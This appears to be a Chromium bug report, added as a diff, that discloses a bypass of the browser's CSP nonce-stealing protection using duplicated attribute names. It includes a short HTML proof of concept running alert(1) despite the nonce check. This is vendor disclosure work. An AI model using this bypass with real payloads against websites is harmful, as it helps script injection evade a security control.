@@ -1,0 +1,33 @@
+UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
+
+Steps to reproduce the problem:
+As stated in https://github.com/w3c/webappsec-csp/issues/98 ; Chromium contains a protection against nonce stealing prevention, with detecting "<script" or "<style" in attribute name or value.
+
+The prevention could be bypassed by duplicate attribute's name, for example:
+
+<!-- the following will not execute -->
+<meta http-equiv=Content-Security-Policy
+      content="script-src 'nonce-abcd'">
+<script src=data:,alert(1) nonce="abcd" >
+</script>
+
+<!-- the following will execute -->
+<meta http-equiv=Content-Security-Policy
+      content="script-src 'nonce-abcd'">
+<script src=data:,alert(1) x="" x="<script" nonce="abcd" >
+</script>
+
+Please note that the issue has already been discussed in public:
+- https://twitter.com/SecurityMB/status/883641714296193024
+- https://jsbin.com/kayesofuto/edit?html,output
+
+What is the expected behavior?
+
+What went wrong?
+The prevention should detect "<script" string even if it is within a duplicated attribute.
+
+Did this work before? N/A
+
+Chrome version: 59.0.3071.115  Channel: stable
+OS Version: OS X 10.12.5
+Flash Version:
